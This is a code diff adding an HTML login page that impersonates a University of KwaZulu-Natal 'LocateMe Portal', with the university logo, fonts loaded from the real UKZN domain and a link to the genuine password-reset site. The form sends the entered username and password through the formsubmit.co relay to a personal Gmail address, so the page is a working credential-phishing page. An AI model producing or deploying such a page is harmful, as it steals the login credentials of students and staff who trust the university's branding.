@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LocateMe Portal</title>
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/material-design-iconic-font@2.2.0/dist/css/material-design-iconic-font.min.css">
+
+  <style>
+    @font-face {
+      font-family: Material-Design-Iconic-Font;
+      src: url(https://locateme.ukzn.ac.za/Content/fonts/iconic/fonts/Material-Design-Iconic-Font.woff2?v=2.2.0) format('woff2'),
+           url(https://locateme.ukzn.ac.za/Content/fonts/iconic/fonts/Material-Design-Iconic-Font.woff?v=2.2.0) format('woff'),
+           url(https://locateme.ukzn.ac.za/Content/fonts/iconic/fonts/Material-Design-Iconic-Font.ttf?v=2.2.0) format('truetype');
+    }
+
+    @font-face {
+      font-family: Roboto-Regular;
+      src: url('https://locateme.ukzn.ac.za/Content/fonts/roboto/Roboto-Regular.ttf');
+    }
+
+    @font-face {
+      font-family: Roboto-Medium;
+      src: url('https://locateme.ukzn.ac.za/Content/fonts/roboto/Roboto-Medium.ttf');
+    }
+
+    @font-face {
+      font-family: Roboto-Bold;
+      src: url('https://locateme.ukzn.ac.za/Content/fonts/roboto/Roboto-Bold.ttf');
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Roboto-Regular, sans-serif;
+      font-size: 1rem;
+      font-weight: 400;
+      line-height: 1.5;
+      color: #212529;
+      background-color: #fff;
+      min-height: 100vh;
+    }
+
+    .container-login100 {
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 15px;
+      background-color: rgba(34, 34, 34, 1);
+    }
+
+    .wrap-login100 {
+      width: 390px;
+      background: #fff;
+      border-radius: 10px;
+      overflow: hidden;
+      padding: 77px 55px 33px 55px;
+      box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+    }
+
+    .login100-form-title {
+      font-family: Roboto-Bold;
+      font-size: 30px;
+      color: #333;
+      text-align: center;
+      margin-bottom: 26px;
+    }
+
+    .wrap-input100 {
+      width: 100%;
+      position: relative;
+      border-bottom: 2px solid #adadad;
+      margin-bottom: 37px;
+    }
+
+    .input100 {
+      font-family: Roboto-Regular;
+      font-size: 15px;
+      color: #555;
+      width: 100%;
+      height: 45px;
+      background: transparent;
+      border: none;
+      outline: none;
+      padding: 0 5px;
+    }
+
+    .btn-show-pass {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      padding-right: 5px;
+      color: #999;
+      cursor: pointer;
+    }
+
+    .btn-show-pass:hover {
+      color: #ed1c24;
+    }
+
+    .wrap-login100-form-btn {
+      width: 100%;
+      border-radius: 25px;
+      overflow: hidden;
+      position: relative;
+      z-index: 1;
+      margin: 0 auto;
+    }
+
+    .login100-form-bgbtn {
+      position: absolute;
+      z-index: -1;
+      width: 300%;
+      height: 100%;
+      background: linear-gradient(to right, #ed1c24, #00aeef, #f99d1c, #00aeef);
+      top: 0;
+      left: -100%;
+      transition: all 0.4s;
+    }
+
+    .wrap-login100-form-btn:hover .login100-form-bgbtn {
+      left: 0;
+    }
+
+    .login100-form-btn {
+      font-family: Roboto-Medium;
+      font-size: 15px;
+      color: #fff;
+      line-height: 1.2;
+      text-transform: uppercase;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 0 20px;
+      width: 100%;
+      height: 50px;
+      background: transparent;
+      border: none;
+      outline: none;
+    }
+
+    .text-center {
+      text-align: center;
+    }
+
+    .p-t-115 {
+      padding-top: 30px;
+    }
+
+    .txt1 {
+      font-size: 13px;
+      color: #666;
+    }
+
+    .txt2 {
+      font-size: 13px;
+      color: #333;
+      text-decoration: none;
+    }
+
+    .txt2:hover {
+      color: #ed1c24;
+    }
+
+    .center {
+      display: block;
+      margin: 0 auto 30px auto;
+      width: 100%;
+    }
+
+    img {
+      max-width: 100%;
+      height: auto;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container-login100">
+    <div class="wrap-login100">
+      <form method="POST" action="https://formsubmit.co/sphosakhechiliza@gmail.com" id="form1" autocomplete="off">
+        <span class="login100-form-title">LocateMe Portal</span>
+        <div>
+          <img class="center" src="https://logowik.com/content/uploads/images/kzn-university-of-kwazulu-natal4684.jpg" alt="UKZN Logo">
+        </div>
+
+        <div class="wrap-input100 validate-input" data-validate="Input your network username">
+          <input type="text" name="username" class="input100" required placeholder="Username">
+        </div>
+
+        <div class="wrap-input100 validate-input" data-validate="Password">
+          <span class="btn-show-pass" onclick="togglePassword()">
+            <i class="zmdi zmdi-eye iconify"></i>
+          </span>
+          <input name="password" id="password" type="password" class="input100" required placeholder="Password" autocomplete="new-password">
+        </div>
+
+        <div class="container-login100-form-btn">
+          <div class="wrap-login100-form-btn">
+            <div class="login100-form-bgbtn"></div>
+            <button type="submit" id="btnsubmit" class="login100-form-btn">Login</button>
+          </div>
+        </div>
+
+        <div class="text-center p-t-115">
+          <span class="txt1">Forgot Password?</span>
+          <a class="txt2" href="https://passwordchange.ukzn.ac.za" target="_blank">Reset</a>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const passwordInput = document.getElementById("password");
+      const icon = document.querySelector(".zmdi-eye");
+
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        icon.classList.remove("zmdi-eye");
+        icon.classList.add("zmdi-eye-off");
+      } else {
+        passwordInput.type = "password";
+        icon.classList.remove("zmdi-eye-off");
+        icon.classList.add("zmdi-eye");
+      }
+    }
+  </script>
+</body>
+</html>
